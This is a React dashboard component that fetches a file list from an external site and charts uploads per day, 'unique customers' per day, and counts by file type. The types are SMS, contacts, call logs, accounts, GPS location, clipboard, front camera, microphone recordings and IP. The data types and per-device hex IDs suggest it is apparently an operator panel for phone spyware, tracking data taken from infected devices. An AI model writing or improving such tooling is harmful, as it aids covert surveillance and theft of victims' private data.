import { useEffect, useState } from "react";
import { Card, CardHeader, CardContent, CardTitle } from "@/components/ui/card";
import { ResponsiveContainer, BarChart, Bar, XAxis, YAxis, Tooltip, PieChart, Pie, Cell } from "recharts";
import {
  Activity, MessageCircle, BookUser, Phone, CreditCard, MapPin,
  Folder, ClipboardList, Camera, Mic, Globe2, Download
} from "lucide-react";

// --- Feature labels and icons ---
const FEATURE_LABELS: Record<string, string> = {
  State: "State",
  Allsm: "Sms",
  allcontac: "Contacts",
  callslog: "Calls",
  Allmalist: "Accounts",
  GPS: "Location",
  TotFolders: "Folders",
  clipboard: "Clipboards",
  camFront: "Camera",
  recsoun: "Microphone",
  pi: "IP",
  Download: "Download",
};
const FEATURE_ICONS: Record<string, any> = {
  State: Activity,
  Allsm: MessageCircle,
  allcontac: BookUser,
  callslog: Phone,
  Allmalist: CreditCard,
  GPS: MapPin,
  TotFolders: Folder,
  clipboard: ClipboardList,
  camFront: Camera,
  recsoun: Mic,
  pi: Globe2,
  Download: Download,
};
// Assign a distinct color per feature (same order as FEATURE_LABELS)
const FEATURE_COLORS: string[] = [
  "#57a44c", "#ef4444", "#eab308", "#3b82f6", "#8b5cf6", "#f59e42",
  "#10b981", "#6366f1", "#a21caf", "#f472b6", "#475569", "#f87171"
];

type FileRec = { name: string };

function isValidDate(year: string, month: string, day: string) {
  const yyyy = parseInt(year, 10);
  const mm = parseInt(month, 10) - 1;
  const dd = parseInt(day, 10);
  const d = new Date(yyyy, mm, dd);
  return (
    d.getFullYear() === yyyy &&
    d.getMonth() === mm &&
    d.getDate() === dd
  );
}

function parseFileName(name: string) {
  const m = name.match(/^([a-f0-9]{16})([A-Za-z]+)(\d{4})(\d{2})(\d{2})\d{6}/i);
  if (!m) return null;
  const id = m[1];
  const type = m[2];
  const year = m[3], month = m[4], day = m[5];
  if (!isValidDate(year, month, day)) return null;
  const date = `${year}-${month}-${day}`;
  const monthStr = `${year}-${month}`;
  return { id, type, date, month: monthStr };
}

function getLastNDates(n: number) {
  const arr: string[] = [];
  const today = new Date();
  for (let i = n - 1; i >= 0; i--) {
    const d = new Date(today);
    d.setDate(today.getDate() - i);
    arr.push(d.toISOString().slice(0, 10));
  }
  return arr;
}

export default function FileStatsDashboard() {
  const [files, setFiles] = useState<FileRec[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch("https://progmarket.site/files.json.php")
      .then(res => res.json())
      .then(setFiles)
      .finally(() => setLoading(false));
  }, []);

  // Only files with valid date
  const fileInfos = files.map(f => parseFileName(f.name)).filter(Boolean);

  // --- Daily (last 7 days) ---
  const last7 = getLastNDates(7);

  // Total files per day (last 7 days)
  const filesByDay = last7.map(date => ({
    date,
    count: fileInfos.filter(f => f.date === date).length,
  }));

  // Unique customer IDs per day (last 7 days)
  const uniqueIDsByDay = last7.map(date => {
    const ids = new Set(fileInfos.filter(f => f.date === date).map(f => f.id));
    return { date, uniqueCustomers: ids.size };
  });

  // PieChart for last 7 days
  const filesInLast7 = fileInfos.filter(f => last7.includes(f.date));
  const typeCounts7: Record<string, number> = {};
  filesInLast7.forEach(f => {
    if (FEATURE_LABELS[f.type]) {
      typeCounts7[f.type] = (typeCounts7[f.type] || 0) + 1;
    }
  });
  const featureKeys = Object.keys(FEATURE_LABELS);
  const typePieData7 = featureKeys.map((type, idx) => ({
    name: FEATURE_LABELS[type],
    rawType: type,
    value: typeCounts7[type] || 0,
    Icon: FEATURE_ICONS[type],
    color: FEATURE_COLORS[idx % FEATURE_COLORS.length],
  })).filter(d => d.value > 0);

  // --- Last 30 days ---
  const last30 = getLastNDates(30);

  // Total files per day (last 30 days)
  const filesByDay30 = last30.map(date => ({
    date,
    count: fileInfos.filter(f => f.date === date).length,
  }));

  // Unique customer IDs per day (last 30 days)
  const uniqueIDsByDay30 = last30.map(date => {
    const ids = new Set(fileInfos.filter(f => f.date === date).map(f => f.id));
    return { date, uniqueCustomers: ids.size };
  });

  // PieChart for last 30 days
  const filesInLast30 = fileInfos.filter(f => last30.includes(f.date));
  const typeCounts30: Record<string, number> = {};
  filesInLast30.forEach(f => {
    if (FEATURE_LABELS[f.type]) {
      typeCounts30[f.type] = (typeCounts30[f.type] || 0) + 1;
    }
  });
  const typePieData30 = featureKeys.map((type, idx) => ({
    name: FEATURE_LABELS[type],
    rawType: type,
    value: typeCounts30[type] || 0,
    Icon: FEATURE_ICONS[type],
    color: FEATURE_COLORS[idx % FEATURE_COLORS.length],
  })).filter(d => d.value > 0);

  // Custom label for PieChart
  function renderCustomizedLabel({ name, percent }: { name: string; percent: number }) {
    return `${name}: ${(percent * 100).toFixed(0)}%`;
  }

  // Custom tooltip for PieChart
  function CustomPieTooltip({ active, payload }: any) {
    if (active && payload && payload.length) {
      const { name, value } = payload[0].payload;
      return (
        <div style={{ background: "#fff", padding: 8, border: "1px solid #eee" }}>
          <b>{name}</b>: {value}
        </div>
      );
    }
    return null;
  }

  // Custom legend (icon+label, icon colored)
  function CustomLegend({ data }: { data: typeof typePieData7 }) {
    return (
      <div className="flex flex-wrap items-center justify-center gap-4 mt-6">
        {data.map((entry) => {
          const Icon = entry.Icon;
          return (
            <div key={entry.rawType} className="flex items-center gap-2">
              {Icon && <Icon size={20} color={entry.color} />}
              <span className="font-medium">{entry.name}</span>
            </div>
          );
        })}
      </div>
    );
  }

  return (
    <div className="grid grid-cols-1 gap-6">
      {/* Daily file and unique customer bar charts (last 7 days) */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>Total files per day (last 7 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-56">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={filesByDay}>
                  <XAxis dataKey="date" />
                  <YAxis />
                  <Tooltip />
                  <Bar dataKey="count" fill="#57a44c" />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </CardContent>
        </Card>
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>Unique customers per day (last 7 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-56">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={uniqueIDsByDay}>
                  <XAxis dataKey="date" />
                  <YAxis allowDecimals={false} />
                  <Tooltip />
                  <Bar dataKey="uniqueCustomers" fill="#ef4444" />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Daily file and unique customer bar charts (last 30 days) */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>Total files per day (last 30 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-56">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={filesByDay30}>
                  <XAxis dataKey="date" />
                  <YAxis />
                  <Tooltip />
                  <Bar dataKey="count" fill="#3b82f6" />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </CardContent>
        </Card>
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>Unique customers per day (last 30 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-56">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={uniqueIDsByDay30}>
                  <XAxis dataKey="date" />
                  <YAxis allowDecimals={false} />
                  <Tooltip />
                  <Bar dataKey="uniqueCustomers" fill="#eab308" />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Two PieCharts side by side */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* PieChart for last 7 days */}
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>File type distribution (last 7 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={typePieData7}
                    dataKey="value"
                    nameKey="name"
                    cx="50%"
                    cy="50%"
                    outerRadius={70}
                    label={renderCustomizedLabel}
                  >
                    {typePieData7.map((entry) => (
                      <Cell key={entry.rawType} fill={entry.color} />
                    ))}
                  </Pie>
                  <Tooltip content={<CustomPieTooltip />} />
                </PieChart>
              </ResponsiveContainer>
            </div>
            {/* Custom legend */}
            <CustomLegend data={typePieData7} />
          </CardContent>
        </Card>
        {/* PieChart for last 30 days */}
        <Card className="glass-morphism">
          <CardHeader>
            <CardTitle>File type distribution (last 30 days)</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={typePieData30}
                    dataKey="value"
                    nameKey="name"
                    cx="50%"
                    cy="50%"
                    outerRadius={70}
                    label={renderCustomizedLabel}
                  >
                    {typePieData30.map((entry) => (
                      <Cell key={entry.rawType} fill={entry.color} />
                    ))}
                  </Pie>
                  <Tooltip content={<CustomPieTooltip />} />
                </PieChart>
              </ResponsiveContainer>
            </div>
            {/* Custom legend */}
            <CustomLegend data={typePieData30} />
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
